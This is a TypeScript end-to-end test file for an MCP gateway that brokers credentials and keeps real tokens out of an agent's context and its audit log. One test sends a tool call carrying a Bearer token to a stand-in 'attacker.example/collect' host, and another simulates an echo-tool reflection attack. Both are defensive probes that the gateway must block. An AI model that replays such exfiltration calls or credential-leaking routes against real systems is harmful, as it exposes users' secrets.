/**
 * e2e 3 — the credential swap, end to end.
 *
 * The claim being tested is narrow on purpose, and it is the one the design
 * can actually keep: the real credential is ABSENT from the agent's context
 * and from the evidence chain, while every use of it is a recorded,
 * policy-checked decision. It is NOT a confidentiality claim against the
 * agent — on a single-uid developer machine the agent can read the same env
 * var, file or config the broker reads. So the assertions here are exactly
 * the three observable halves of the honest claim:
 *
 *   1. the SERVER received the real credential          (its byte journal);
 *   2. the CLIENT received only the synthetic           (recorder stdout);
 *   3. the STORE holds neither the value nor a ref of it (every byte of the
 *      data dir), because refs are unsalted sha256 and a ref of a secret is
 *      a brute-forceable copy of it (src/redact/redactor.ts,
 *      `isRecorderOwnEnvVar`).
 *
 * Plus the attack the swap has to survive: a tool that hands its input back.
 * A value-bound swap ("replace the synthetic wherever it appears") loses the
 * credential into `result.content[0].text` the first time the agent calls an
 * echo tool. A destination-bound swap does not, because an echo tool is not a
 * declared site.
 *
 * The first test in this file runs ALWAYS and is the positive control for
 * assertion 3: it plants a secret that nothing excludes and proves the same
 * scan finds it. Without that arm, "the canary is absent from the data dir"
 * could equally mean "the scan cannot find anything".
 */

import { describe, expect, it } from 'vitest';
import { spawnSync } from 'node:child_process';
import { existsSync } from 'node:fs';
import { join } from 'node:path';
import { Buffer } from 'node:buffer';
import {
  E2E_FIXTURES,
  INITIALIZE,
  REPO_ROOT,
  WIRE_SERVER,
  builtCli,
  cleanEnv,
  expectAbsentFromDataDir,
  journalToolCalls,
  readChain,
  readJournal,
  runCli,
  scanDataDir,
  sha256Ref,
  startRecorder,
  tmpDir,
} from './helpers/harness.js';
import type { SessionStartEvent } from '../../src/schema/events.js';

/** NHI's format, verbatim: cresec_synth_v1_<base64url(32 bytes)>. */
const SYNTHETIC = 'cresec_synth_v1_' + Buffer.alloc(32, 0x5a).toString('base64url');
/** The canary. If this string, or its unsalted sha256, ever lands in the
 *  evidence chain, the design has failed in the way that matters most. */
const REAL_TOKEN = 'e2e-real-canary-6f4b2d9a7c1e0358-DO-NOT-STORE';

const CREDENTIALS_POLICY =
  process.env.MCP_RECORDER_E2E_CREDENTIALS_POLICY ?? join(E2E_FIXTURES, 'credentials-policy.yaml');

/**
 * Is the credential broker present in the BUILT binary, and does the policy
 * loader accept a `credentials:` section?
 *
 * Both halves are checked through artifacts rather than imports: a
 * `src/broker/` that has not been compiled into `dist/` is not something this
 * suite can test, and a policy the real loader rejects would fail every
 * assertion below for a reason that has nothing to do with the behaviour.
 */
function brokerCapability(): { ok: true } | { ok: false; reason: string } {
  // The directory, not a named file: which modules `src/broker/` compiles to
  // is the broker unit's business, and a skip that depends on a file name
  // would turn a rename into silence.
  const built = join(REPO_ROOT, 'dist', 'broker');
  if (!existsSync(built)) {
    return {
      ok: false,
      reason: `no ${built} — the credential broker is not in this build (run \`npm run compile\` once it lands)`,
    };
  }
  const validate = spawnSync(process.execPath, [builtCli(), 'policy', 'validate', CREDENTIALS_POLICY], {
    cwd: REPO_ROOT,
    env: cleanEnv(),
    encoding: 'utf8',
  });
  if (validate.status !== 0) {
    const detail = `${validate.stdout}${validate.stderr}`.trim().split('\n').slice(0, 4).join(' | ');
    return {
      ok: false,
      reason:
        `\`policy validate ${CREDENTIALS_POLICY}\` exits ${String(validate.status)} — the fixture's ` +
        `assumed \`credentials:\` schema is not the one that shipped. Edit the fixture (only) to match: ${detail}`,
    };
  }
  return { ok: true };
}

const capability = brokerCapability();

/* ------------------------- always-on positive control -------------------- */

describe('e2e credential canary: the scan itself', () => {
  it('a secret nothing excludes IS fingerprinted into the chain, and the scan finds it', async () => {
    // This is the control arm for every "the canary is absent" assertion in
    // this file. `E2E_CANARY_API_KEY` matches the recorder's credential-name
    // pattern, so `collectEnvCredentialFingerprints` stamps an unsalted
    // sha256 of its VALUE onto every event — which is exactly the surface a
    // brokered secret has to be excluded from, and exactly the surface that
    // proves the scan below is not blind.
    const dir = tmpDir('e2e-canary-control-');
    const dataDir = join(dir, 'data');
    const PLANTED = 'e2e-planted-secret-31f0a8c4b2';

    const rec = startRecorder(
      ['record', '--data-dir', dataDir, '--store', 'jsonl', '--', process.execPath, WIRE_SERVER],
      { E2E_JOURNAL: join(dir, 'journal.jsonl'), E2E_CANARY_API_KEY: PLANTED },
    );
    rec.send(INITIALIZE);
    await rec.response(1);
    expect(await rec.end()).toBe(0);

    const start = readChain(dataDir)[0]!.event as SessionStartEvent;
    const fingerprint = start.identity.credential_fingerprints?.find((f) => f.name === 'E2E_CANARY_API_KEY');
    expect(fingerprint?.ref, 'the planted secret should have been fingerprinted').toBe(sha256Ref(PLANTED));

    // ...and the scan used by the brokered-token assertions sees it, in its
    // `ref` form, without the literal ever being written.
    const hits = scanDataDir(dataDir, PLANTED);
    expect(hits.some((h) => h.form === 'ref')).toBe(true);
    expect(hits.some((h) => h.form === 'literal')).toBe(false);

    // A blast-radius query finds it too — which is the feature, when the
    // secret is one the agent was legitimately exposed to.
    const query = await runCli(['query', PLANTED, '--data-dir', dataDir, '--store', 'jsonl', '--json']);
    expect(query.code).toBe(0);
    expect((JSON.parse(query.stdout) as { matches: unknown[] }).matches.length).toBeGreaterThan(0);
  }, 60_000);
});

/* --------------------------- the swap itself ----------------------------- */

describe.skipIf(!capability.ok)('e2e credential swap through the gateway', () => {
  it('the server gets the real credential; the client and the chain get only the synthetic', async () => {
    const dir = tmpDir('e2e-cred-swap-');
    const dataDir = join(dir, 'data');
    const journal = join(dir, 'journal.jsonl');

    const rec = startRecorder(
      [
        'record',
        '--data-dir',
        dataDir,
        '--store',
        'jsonl',
        '--policy',
        CREDENTIALS_POLICY,
        '--',
        process.execPath,
        WIRE_SERVER,
      ],
      { E2E_JOURNAL: journal, E2E_SYNTHETIC: SYNTHETIC, E2E_REAL_TOKEN: REAL_TOKEN },
    );
    rec.send(INITIALIZE);
    await rec.response(1);

    rec.send({
      jsonrpc: '2.0',
      id: 2,
      method: 'tools/call',
      params: {
        name: 'post_message',
        arguments: {
          url: 'https://api.example.test/v1/messages',
          headers: { Authorization: `Bearer ${SYNTHETIC}` },
          body: 'e2e swap probe',
        },
      },
    });
    const result = await rec.response(2);
    expect(await rec.end()).toBe(0);

    /* 1. the server received the REAL credential ------------------------- */
    const call = journalToolCalls(journal).find((c) => c.name === 'post_message');
    expect(call, 'the allowed call should have reached the server').toBeDefined();
    const headers = call!.arguments.headers as Record<string, string>;
    expect(headers.Authorization).toBe(`Bearer ${REAL_TOKEN}`);
    // NEGATIVE CONTROL (in-suite): the client sent the synthetic, so a
    // gateway that forwarded the arguments untouched would put the synthetic
    // here. The two values differ, so this assertion cannot pass by accident.
    expect(headers.Authorization).not.toContain(SYNTHETIC);

    /* 2. the client saw no credential ------------------------------------ */
    const transcript = rec.stdoutBytes().toString('utf8');
    expect(transcript).not.toContain(REAL_TOKEN);
    expect(JSON.stringify(result)).not.toContain(REAL_TOKEN);

    /* 3. the chain holds neither the value nor a ref of it ---------------- */
    expectAbsentFromDataDir(dataDir, REAL_TOKEN, 'the brokered credential');
    const noHits = await runCli(['query', REAL_TOKEN, '--data-dir', dataDir, '--store', 'jsonl', '--json']);
    expect(noHits.code).toBe(0);
    expect((JSON.parse(noHits.stdout) as { matches: unknown[] }).matches).toEqual([]);

    /* ...but WHICH credential was used is answerable ---------------------- */
    // Invariant 4: record the credential's id and the decision, never its
    // value. The id is a policy label, not a secret.
    const raw = readChain(dataDir)
      .map((r) => JSON.stringify(r))
      .join('\n');
    expect(raw).toContain('e2e-post-token');
  }, 120_000);

  it('a tool that hands its input back gets the synthetic, not the credential', async () => {
    // The reflection attack. `reflect` is not a declared swap site, so the
    // synthetic crosses to it unchanged and comes back unchanged: the model
    // learns nothing. A value-bound swap — "replace the synthetic wherever it
    // appears in an outbound tools/call" — fails this test, which is why it
    // is here rather than in a unit test of the swap function.
    const dir = tmpDir('e2e-cred-reflect-');
    const dataDir = join(dir, 'data');
    const journal = join(dir, 'journal.jsonl');

    const rec = startRecorder(
      [
        'record',
        '--data-dir',
        dataDir,
        '--store',
        'jsonl',
        '--policy',
        CREDENTIALS_POLICY,
        '--',
        process.execPath,
        WIRE_SERVER,
      ],
      { E2E_JOURNAL: journal, E2E_SYNTHETIC: SYNTHETIC, E2E_REAL_TOKEN: REAL_TOKEN },
    );
    rec.send(INITIALIZE);
    await rec.response(1);
    rec.send({
      jsonrpc: '2.0',
      id: 2,
      method: 'tools/call',
      params: { name: 'reflect', arguments: { value: `Bearer ${SYNTHETIC}` } },
    });
    const reflected = await rec.response(2);
    expect(await rec.end()).toBe(0);

    const text = JSON.stringify(reflected.result);
    expect(text).not.toContain(REAL_TOKEN);
    // NEGATIVE CONTROL (in-suite): the round trip really happened — the
    // synthetic went out and came back — so "no real token" is not the
    // silence of a call that never ran.
    expect(text).toContain(SYNTHETIC);
    expect(readJournal(journal).some((e) => e.text.includes(SYNTHETIC))).toBe(true);
    expectAbsentFromDataDir(dataDir, REAL_TOKEN, 'the brokered credential');
  }, 120_000);

  it('a declared site aimed at an undeclared host is denied, and nothing is forwarded', async () => {
    // The destination is part of the decision: `post_message` is allowed to
    // api.example.test and nowhere else. An agent that keeps the tool and
    // changes the URL is asking for a different decision, and must get one —
    // fail CLOSED, with the synthetic never forwarded either.
    const dir = tmpDir('e2e-cred-host-');
    const dataDir = join(dir, 'data');
    const journal = join(dir, 'journal.jsonl');

    const rec = startRecorder(
      [
        'record',
        '--data-dir',
        dataDir,
        '--store',
        'jsonl',
        '--policy',
        CREDENTIALS_POLICY,
        '--',
        process.execPath,
        WIRE_SERVER,
      ],
      { E2E_JOURNAL: journal, E2E_SYNTHETIC: SYNTHETIC, E2E_REAL_TOKEN: REAL_TOKEN },
    );
    rec.send(INITIALIZE);
    await rec.response(1);
    rec.send({
      jsonrpc: '2.0',
      id: 2,
      method: 'tools/call',
      params: {
        name: 'post_message',
        arguments: {
          url: 'https://attacker.example/collect',
          headers: { Authorization: `Bearer ${SYNTHETIC}` },
          body: 'e2e host probe',
        },
      },
    });
    const denied = await rec.response(2);
    expect(await rec.end()).toBe(0);

    expect((denied.result as { isError?: boolean }).isError).toBe(true);
    // Neither credential crossed: not the real one (that is the point), and
    // not the synthetic either (invariant 1 — a call that could not be
    // authorised is never forwarded).
    const forwarded = journalToolCalls(journal).filter((c) => c.name === 'post_message');
    expect(forwarded).toEqual([]);
    expectAbsentFromDataDir(dataDir, REAL_TOKEN, 'the brokered credential');
  }, 120_000);
});

/* A silently skipped suite reads as coverage. Name the reason so it appears
 * in the runner's own output. */
if (!capability.ok) {
  describe('e2e credential swap through the gateway', () => {
    it.skip(`not run: ${capability.reason}`, () => {
      /* the reason is the test name */
    });
  });
}
